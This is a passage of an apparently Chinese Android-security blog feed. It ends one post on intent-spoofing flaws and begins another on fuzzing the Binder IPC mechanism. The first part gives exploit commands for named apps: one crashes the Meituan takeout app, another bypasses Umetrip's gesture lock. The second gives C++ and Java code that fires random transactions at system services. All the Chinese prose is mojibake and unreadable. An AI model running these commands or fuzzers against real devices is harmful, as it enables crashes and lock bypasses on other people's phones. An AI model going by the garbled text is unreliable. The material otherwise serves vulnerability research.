http://192.168.102.204/mijian_2.5.1_272.apk<br></code></pre></td></tr></table></figure><h4 id="ç¾å›¢å¤–å–å®¢æˆ·ç«¯æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´"><a href="#ç¾å›¢å¤–å–å®¢æˆ·ç«¯æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´" class="headerlink" title="ç¾å›¢å¤–å–å®¢æˆ·ç«¯æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´"></a>ç¾å›¢å¤–å–å®¢æˆ·ç«¯æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´</h4><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0106580">http://www.wooyun.org/bugs/wooyun-2010-0106580</a></p><p>åˆ©ç”¨ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell am startservice -n com.sankuai.meituan.takeoutnew/com.sankuai.mtmp.service.MtmpService<br></code></pre></td></tr></table></figure><h4 id="èˆªæ—…çºµæ¨ªæ‰‹åŠ¿é”è½»æ˜“ç»•è¿‡åŠå…¶å®ƒæ¼æ´"><a href="#èˆªæ—…çºµæ¨ªæ‰‹åŠ¿é”è½»æ˜“ç»•è¿‡åŠå…¶å®ƒæ¼æ´" class="headerlink" title="èˆªæ—…çºµæ¨ªæ‰‹åŠ¿é”è½»æ˜“ç»•è¿‡åŠå…¶å®ƒæ¼æ´"></a>èˆªæ—…çºµæ¨ªæ‰‹åŠ¿é”è½»æ˜“ç»•è¿‡åŠå…¶å®ƒæ¼æ´</h4><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0111692">http://www.wooyun.org/bugs/wooyun-2010-0111692</a></p><p>åˆ©ç”¨ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">am start com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li>[1] <a href="https://appvigil.co/blog/intent-spoofing-vulnerability-in-android-apps/">Intent Spoofing Vulnerability in Android Apps â€“ OWASP Top 10</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Binder Fuzzing çš„ä¸€äº›æ€è·¯</title>
    <link href="/cn/Android_binder_fuzzing/"/>
    <url>/cn/Android_binder_fuzzing/</url>
    
    <content type="html"><![CDATA[<h2 id="1-binder-ç®€ä»‹"><a href="#1-binder-ç®€ä»‹" class="headerlink" title="1. binder ç®€ä»‹"></a>1. binder ç®€ä»‹</h2><p>Androidå®‰å…¨æ¨¡å‹çš„ä¸€ä¸ªå…³é”®éƒ¨åˆ†æ˜¯æ¯ä¸€ä¸ªåº”ç”¨ç¨‹åºéƒ½è¢«èµ‹äºˆä¸€ä¸ªå”¯ä¸€çš„ Linux ç”¨æˆ· ID å’Œç»„ IDï¼Œè¿è¡Œåœ¨è‡ªå·±çš„è¿›ç¨‹å’Œ Dalvik è™šæ‹Ÿæœºé‡Œã€‚<br>åœ¨åº”ç”¨ç¨‹åºå®‰è£…çš„è¿‡ç¨‹ä¸­ï¼ŒAndroidç³»ç»Ÿè®¾å¤‡ä¸Šåˆ›å»ºä¸€ä¸ªä¸“é—¨çš„ç›®å½•ï¼ˆæ–‡ä»¶å¤¹ï¼‰ï¼Œç”¨äºå­˜å‚¨æ­¤åº”ç”¨ç¨‹åºçš„æ•°æ®ï¼Œå¹¶ä¸”ä»…å…è®¸åº”ç”¨ç¨‹åºåˆ©ç”¨<br>Linux ç”¨æˆ· ID å’Œç»„ ID çš„ç›¸åº”è®¿é—®æƒé™å¯¹è¿™äº›æ•°æ®è¿›è¡Œè®¿é—®ã€‚æ­¤å¤–ï¼Œæ­¤åº”ç”¨ç¨‹åºçš„ Dalvik è™šæ‹Ÿæœºä½¿ç”¨åº”ç”¨ç¨‹åºçš„ç”¨æˆ· ID è¿è¡Œåœ¨è‡ªå·±çš„è¿›ç¨‹ä¸­ã€‚<br>è¿™äº›å…³é”®çš„æœºåˆ¶åœ¨æ“ä½œç³»ç»Ÿå±‚é¢ä¸Šå¼ºåˆ¶æ•°æ®å®‰å…¨ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºä¹‹é—´ä¸å…±äº«å†…å­˜ã€è®¿é—®æƒé™åŠç£ç›˜å­˜å‚¨ã€‚åº”ç”¨ç¨‹åºåªèƒ½åœ¨å®ƒä»¬è‡ªå·±çš„ Dalvik è™šæ‹ŸæœºèŒƒå›´å†…è®¿é—®å†…å­˜å’Œæ•°æ®ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ps<br>...<br><br>u0_a16        2757   882 2574956 116944 SyS_epoll+          0 S com.google.android.gms.persistent<br>u0_a128       2774   883 1939084  87720 SyS_epoll+          0 S com.ss.android.article.news:push<br>u0_a16        2850   882 2322980  46592 SyS_epoll+          0 S com.google.process.gapps<br>u0_a128       2887   883 2190568 181868 SyS_epoll+          0 S com.ss.android.article.news<br>u0_a37        2900   882 2430908  58316 SyS_epoll+          0 S com.google.android.googlequicksearchbox:interactor<br>nfc           2918   882 2351828  62356 SyS_epoll+          0 S com.android.nfc<br>u0_a45        2930   882 2309884  43576 SyS_epoll+          0 S se.dirac.acs<br>radio         2945   882 2313144  45592 SyS_epoll+          0 S net.oneplus.push<br>u0_a0         2956   882 2304600  36360 SyS_epoll+          0 S com.oneplus<br>system        2967   882 2307276  38088 SyS_epoll+          0 S com.fingerprints.serviceext<br>system        2985   882 2309992  42044 SyS_epoll+          0 S com.oneplus.opbugreportlite<br>u0_a142       2997   882 2370296  93324 SyS_epoll+          0 S com.oneplus.aod<br>u0_a16        3018   882 2731976 165828 SyS_epoll+          0 S com.google.android.gms<br>...<br></code></pre></td></tr></table></figure><p>Android app æ˜¯ç”± Activityã€Serviceã€Broadcast å’Œ Content Provider å››å¤§ç»„ä»¶æ„æˆï¼Œè€Œè¿™äº›ç»„ä»¶å¯èƒ½è¿è¡Œåœ¨åŒä¸€è¿›ç¨‹ä¸­ï¼Œä¹Ÿå¯èƒ½è¿è¡Œåœ¨ä¸åŒçš„<br>è¿›ç¨‹ä¸­ï¼Œè€Œåƒ PowerManagerServiceç­‰é‡è¦æœåŠ¡éƒ½è¿è¡Œåœ¨æ ¸å¿ƒè¿›ç¨‹ <code>system_server</code> é‡Œï¼Œæ‰€ä»¥ Android ç³»ç»Ÿå¿…é¡»å®ç°ä¸€ä¸ªé è°±çš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ ï¼ˆIPCï¼‰ã€‚<br>Androidç³»ç»ŸåŸºäº Linux å¼€å‘ï¼ŒLinux ä¸­æœ‰å¾ˆå¤šè¿›ç¨‹é—´é€šä¿¡çš„æ–¹æ³•ï¼Œå¦‚ Signalã€Pipeã€Socketã€Share Memeoryã€Semaphoreï¼Œ ä½†æ˜¯ Android ç³»ç»Ÿå¹¶æ²¡æœ‰ä½¿ç”¨<br>è¿™äº›è¿›ç¨‹é—´é€šä¿¡çš„æ–¹æ³•ï¼Œè€Œæ˜¯åŸºäº OpenBinder è‡ªå·±å¼€å‘äº†ä¸€å¥—è¿›ç¨‹é€šä¿¡çš„æ–¹æ³•ï¼ŒBinder æ˜¯ Android ç³»ç»Ÿ IPC é€šä¿¡çš„æœºåˆ¶ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ adb shell ps | grep system_server<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>63 32 120160 35408 ffffffff afd0c738 S system_server<br><br>$ adb logcat | grep <span class="hljs-string">&quot;63)&quot;</span><br><span class="hljs-built_in">..</span>.<br>D/PowerManagerService( 63): bootCompleted<br>I/TelephonyRegistry( 63): notifyServiceState: 0 home Android Android 310260 UMTS CSS <span class="hljs-keyword">not</span> supp<span class="hljs-built_in">..</span>.<br>I/TelephonyRegistry( 63): notifyDataConnection: <span class="hljs-attribute">state</span>=0 <span class="hljs-attribute">isDataConnectivityPossible</span>=<span class="hljs-literal">false</span> <span class="hljs-attribute">reason</span>=<span class="hljs-literal">null</span><br><span class="hljs-attribute">interfaceName</span>=<span class="hljs-literal">null</span> <span class="hljs-attribute">networkType</span>=3<br>I/SearchManagerService( 63): Building list of searchable activities<br>I/WifiService( 63): WifiService trying <span class="hljs-keyword">to</span> setNumAllowed <span class="hljs-keyword">to</span> 11 with persist <span class="hljs-built_in">set</span> <span class="hljs-keyword">to</span> <span class="hljs-literal">true</span><br>I/ActivityManager( 63):<span class="hljs-built_in"> Config </span>changed: &#123; <span class="hljs-attribute">scale</span>=1.0 <span class="hljs-attribute">imsi</span>=310/260 <span class="hljs-attribute">loc</span>=en_US <span class="hljs-attribute">touch</span>=3 <span class="hljs-attribute">keys</span>=2/1/2 <span class="hljs-attribute">nav</span>=3/1 <span class="hljs-built_in">..</span>.<br>I/TelephonyRegistry( 63): notifyMessageWaitingChanged: <span class="hljs-literal">false</span><br>I/TelephonyRegistry( 63): notifyCallForwardingChanged: <span class="hljs-literal">false</span><br>I/TelephonyRegistry( 63): notifyDataConnection: <span class="hljs-attribute">state</span>=1 <span class="hljs-attribute">isDataConnectivityPossible</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">reason</span>=simL...<br>I/TelephonyRegistry( 63): notifyDataConnection: <span class="hljs-attribute">state</span>=2 <span class="hljs-attribute">isDataConnectivityPossible</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">reason</span>=simL...<br>D/Tethering( 63): MasterInitialState.processMessage <span class="hljs-attribute">what</span>=3<br>I/ActivityManager( 63): Start proc android.process.media <span class="hljs-keyword">for</span> broadcast<br>com.android.providers.downloads/.DownloadReceiver: <span class="hljs-attribute">pid</span>=223 <span class="hljs-attribute">uid</span>=10002 gids=&#123;1015, 2001, 3003&#125;<br>I/RecoverySystem( 63): <span class="hljs-literal">No</span> recovery log file<br>W/WindowManager( 63): App freeze timeout expired.<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226160614691_1337421380.png" alt="binder"></p><h2 id="2-Binder-æ¶æ„"><a href="#2-Binder-æ¶æ„" class="headerlink" title="2. Binder æ¶æ„"></a>2. Binder æ¶æ„</h2><p>Binder ä½¿ç”¨ CS ï¼ˆClient&#x2F;Serverï¼‰ æ¨¡å‹ï¼Œæä¾›æœåŠ¡çš„è¿›ç¨‹æ˜¯ Server è¿›ç¨‹ï¼Œè®¿é—®æœåŠ¡çš„æ˜¯ Client è¿›ç¨‹ã€‚ä»ä»£ç å®ç°çš„è§’åº¦çœ‹ï¼ŒBinderæ¶æ„é‡‡ç”¨çš„æ˜¯åˆ†å±‚æ¶æ„è®¾è®¡,<br>å¤§è‡´ä¸Šå¯ä»¥åˆ†ä¸º Java å±‚ï¼Œ Java IPC å±‚ï¼ŒNative IPC å±‚ï¼Œ Linux å†…æ ¸å±‚ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224151909041_1890401128.png" alt="1"></p><p>ä»ç»„ä»¶çš„è§†è§’æ¥çœ‹ï¼ŒBinder åŒ…å«äº† Clientã€Serverã€ServiceManger å’Œ binder é©±åŠ¨ï¼Œ ServiceManager ç”¨äºç®¡ç†ç³»ç»Ÿä¸­çš„å„ç§æœåŠ¡ï¼Œè§ä¸‹å›¾ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224155625665_1820827979.gif" alt="2"></p><p>å›¾ä¸­è™šçº¿çš„ç®­å¤´ä¸ºè·¨è¿›ç¨‹çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œå¿…é¡»ä½¿ç”¨ Android IPC binder æœºåˆ¶ã€‚</p><h2 id="3-ä¸ºä»€ä¹ˆè¦-fuzz-binder"><a href="#3-ä¸ºä»€ä¹ˆè¦-fuzz-binder" class="headerlink" title="3. ä¸ºä»€ä¹ˆè¦ fuzz binder"></a>3. ä¸ºä»€ä¹ˆè¦ fuzz binder</h2><p>æŠŠ Binder ä½œä¸ºä¸€ä¸ªç›®æ ‡çš„åŸå› æ¯”è¾ƒæ˜æ˜¾çš„ï¼Œå› ä¸ºåœ¨ Android çš„å®‰å…¨æ¨¡å‹ä¸­ï¼ŒBinder æ˜¯ä¸€ä¸ªé‡è¦çš„å®‰å…¨è¾¹ç•Œã€‚åœ¨ä¸€ä¸ªä½æƒé™<br>çš„ app é‡Œé¢æ„é€ çš„æ•°æ®ï¼Œä¼šåœ¨é«˜æƒé™çš„è¿›ç¨‹é‡Œé¢ä½¿ç”¨ï¼Œå¦‚æœå‘ç”Ÿé—®é¢˜ï¼Œå°±æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„æƒé™æå‡æ¼æ´ã€‚å¦å¤–æ•°æ®åœ¨å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œ<br>æœ‰ flatten å’Œ unflatten ä¸¤ä¸ªæ­¥éª¤ï¼Œè¿™äº›æ­¥éª¤å°±åƒæˆ‘ä»¬å¹³æ—¶è¯´çš„ç¼–ç å’Œè§£ç ä¸€æ ·éå¸¸å®¹æ˜“å‡ºé—®é¢˜ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225102933309_922476451.png" alt="weakness"></p><p>å­˜åœ¨ä¸€äº›éå¸¸ç»å…¸çš„æ¼æ´ï¼Œ ä¾‹å¦‚ CVE-2014-7911 è¯¥æ¼æ´å…è®¸æ¶æ„åº”ç”¨ä»æ™®é€šåº”ç”¨æƒé™ææƒåˆ°systemç”¨æˆ·æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="4-å®ç°"><a href="#4-å®ç°" class="headerlink" title="4. å®ç°"></a>4. å®ç°</h2><p>åœ¨æ¯ä¸ªå±‚é¢éƒ½å¯ä»¥å®ç°ç›¸å…³ä»£ç è¿›è¡Œ Fuzzï¼Œ ä¸‹é¢åˆ†æåœ¨æ¯ä¸ªå±‚é¢çš„å…·ä½“å®ç°ã€‚</p><h3 id="4-1-ç›´æ¥è°ƒç”¨-ioctl"><a href="#4-1-ç›´æ¥è°ƒç”¨-ioctl" class="headerlink" title="4.1  ç›´æ¥è°ƒç”¨ ioctl"></a>4.1  ç›´æ¥è°ƒç”¨ ioctl</h3><p>å®ç° Binder fuzzer çš„æ–¹æ³•æœ‰å¥½å‡ ç§ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•å½“ç„¶å°±æ˜¯ç›´æ¥è°ƒç”¨ ioctl ç³»ç»Ÿè°ƒç”¨ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225101500954_2019536930.png" alt="ioctl"></p><p>å…¶ä¸­ fd å¯ä»¥é€šè¿‡æ‰“å¼€ &#x2F;dev&#x2F;binder è®¾å¤‡æ–‡ä»¶è·å¾—ï¼Œéš¾ç‚¹åœ¨ <code>binder_write_read</code> æ•°æ®ç»“æ„çš„æ„é€ ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/binder&quot;</span>, O_RDWR);<br></code></pre></td></tr></table></figure><h3 id="4-2-Native-å±‚"><a href="#4-2-Native-å±‚" class="headerlink" title="4.2 Native å±‚"></a>4.2 Native å±‚</h3><p>åœ¨ Native å±‚ï¼Œåˆ©ç”¨ IBinder å¯ä»¥å°†é—®é¢˜ç®€åŒ–ï¼Œ çœ‹ä¸Šé¢çš„ç»“æ„å›¾ï¼Œé€šè¿‡é˜…è¯» Android æºç ï¼Œ å¯ä»¥çœ‹å‡ºæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ IBinder<br>çš„ transcat æ¥è°ƒç”¨ç›¸åº”çš„Binder æ¥å£å‡½æ•°ï¼Œå‚è€ƒï¼š</p><p><a href="https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp">https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp</a></p><p>è°ƒç”¨ IBinder çš„ transact éœ€è¦è‡ªå·±å¡«å…… parcel æ•°æ®ï¼Œ å¯ä»¥ä»ä¸‹é¢çš„ç¤ºæ„ç†è§£å¤§è‡´çš„å«ä¹‰ï¼š</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226153937869_763457039.png" alt="5"></p><p>code ä¸º Binder è°ƒç”¨æ¥å£çš„åŠŸèƒ½å·ï¼Œ parcel ä¸­éœ€è¦æŒ‡å®šè°ƒç”¨é‚£ä¸ªæ¥å£ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">String16 <span class="hljs-title">get_interface_name</span><span class="hljs-params">(sp&lt;IBinder&gt; service)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (service != <span class="hljs-literal">NULL</span>) &#123;<br>        Parcel data, reply;<br>        <span class="hljs-type">status_t</span> err = service-&gt;<span class="hljs-built_in">transact</span>(IBinder::INTERFACE_TRANSACTION, data, &amp;reply);<br>        <span class="hljs-keyword">if</span> (err == NO_ERROR) &#123;<br>            <span class="hljs-keyword">return</span> reply.<span class="hljs-built_in">readString16</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">String16</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span>.</span><br><span class="hljs-function"></span>&#123;<br>    sp&lt;IServiceManager&gt; sm = <span class="hljs-built_in">defaultServiceManager</span>();<br>    Vector&lt;String16&gt; services = sm-&gt;<span class="hljs-built_in">listServices</span>();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; services.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        String16 name = services[i];<br>        sp&lt;IBinder&gt; service = sm-&gt;<span class="hljs-built_in">checkService</span>(name);<br>        String16 ifName = <span class="hljs-built_in">get_interface_name</span>(service);<br>        <span class="hljs-keyword">if</span> (service != <span class="hljs-literal">NULL</span> &amp;&amp; ifName.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> code = <span class="hljs-number">0</span>; code &lt;= <span class="hljs-number">100</span>; code++) &#123;<br>                aout &lt;&lt; <span class="hljs-string">&quot;ifName: &quot;</span> &lt;&lt; ifName &lt;&lt; <span class="hljs-string">&quot;, code: &quot;</span> &lt;&lt; code &lt;&lt; endl;<br><br>                Parcel data, reply;<br>                data.<span class="hljs-built_in">writeInterfaceToken</span>(ifName);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">random</span>() % <span class="hljs-number">800</span>; i++ ) &#123;<br>                    <span class="hljs-type">uint32_t</span> a = <span class="hljs-built_in">random</span>();<br>                    aout &lt;&lt; <span class="hljs-string">&quot;data[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]: &quot;</span> &lt;&lt; a &lt;&lt; endl;<br>                    data.<span class="hljs-built_in">writeInt32</span>(a);<br>                &#125;<br>                service-&gt;<span class="hljs-built_in">transact</span>(code, data, &amp;reply, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-3-Java-åº”ç”¨å±‚"><a href="#4-3-Java-åº”ç”¨å±‚" class="headerlink" title="4.3 Java åº”ç”¨å±‚"></a>4.3 Java åº”ç”¨å±‚</h3><p>åˆ°äº† Java åº”ç”¨å±‚ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—çš„ä¿¡æ¯å°±ä¸°å¯Œäº†ï¼Œå¯ä»¥è·å¾—è¯¦ç»†çš„ä¿¡æ¯ã€‚</p><h4 id="1-è·å–æ‰€æœ‰è¿è¡Œçš„services"><a href="#1-è·å–æ‰€æœ‰è¿è¡Œçš„services" class="headerlink" title="1) è·å–æ‰€æœ‰è¿è¡Œçš„services"></a>1) è·å–æ‰€æœ‰è¿è¡Œçš„services</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String[] getServices() &#123;<br>    String[] services = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        services = (String[]) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>                .getDeclaredMethod(<span class="hljs-string">&quot;listServices&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> services;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-è·å¾—å¯¹åº”æœåŠ¡çš„IBinder-å¯¹è±¡"><a href="#2-è·å¾—å¯¹åº”æœåŠ¡çš„IBinder-å¯¹è±¡" class="headerlink" title="2) è·å¾—å¯¹åº”æœåŠ¡çš„IBinder å¯¹è±¡"></a>2) è·å¾—å¯¹åº”æœåŠ¡çš„IBinder å¯¹è±¡</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">getIBinder</span><span class="hljs-params">(String service)</span> &#123;<br>    <span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serviceBinder = (IBinder) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>                .getDeclaredMethod(<span class="hljs-string">&quot;getService&quot;</span>, String.class).invoke(<span class="hljs-literal">null</span>, service);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> serviceBinder;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£çš„æ‰€æœ‰code"><a href="#3-åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£çš„æ‰€æœ‰code" class="headerlink" title="3) åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£çš„æ‰€æœ‰code"></a>3) åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£çš„æ‰€æœ‰code</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> HashMap&lt;String,Integer&gt; <span class="hljs-title function_">getBinderCode</span><span class="hljs-params">(String interfaceDescriptor)</span> &#123;<br>    HashMap&lt;String, Integer&gt; codes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">if</span> (interfaceDescriptor == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> codes;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Class&lt;?&gt; cStub = Class<br>                .forName(interfaceDescriptor + <span class="hljs-string">&quot;$Stub&quot;</span>);<br>        Field[] f = cStub.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (Field field : f) &#123;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            String k= field.toString().split(<span class="hljs-string">&quot;\\$Stub\\.&quot;</span>)[<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (k.contains(<span class="hljs-string">&quot;TRANSACTION&quot;</span>))<br>                codes.put(k, (<span class="hljs-type">int</span>)field.get(<span class="hljs-built_in">this</span>));<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> codes;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£æ‰€æœ‰è°ƒç”¨çš„å‚æ•°ç±»å‹"><a href="#4-åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£æ‰€æœ‰è°ƒç”¨çš„å‚æ•°ç±»å‹" class="headerlink" title="4) åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£æ‰€æœ‰è°ƒç”¨çš„å‚æ•°ç±»å‹"></a>4) åˆ©ç”¨åå°„è·å–å¯¹åº”æ¥å£æ‰€æœ‰è°ƒç”¨çš„å‚æ•°ç±»å‹</h4><p>binder call çš„å‚æ•°ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> HashMap&lt;String, List&lt;String&gt;&gt;<br>    <span class="hljs-title function_">getBinderCallParameter</span><span class="hljs-params">(String interfaceDescriptor,</span><br><span class="hljs-params">                           HashMap&lt;String, Integer&gt; codes)</span> &#123;<br>    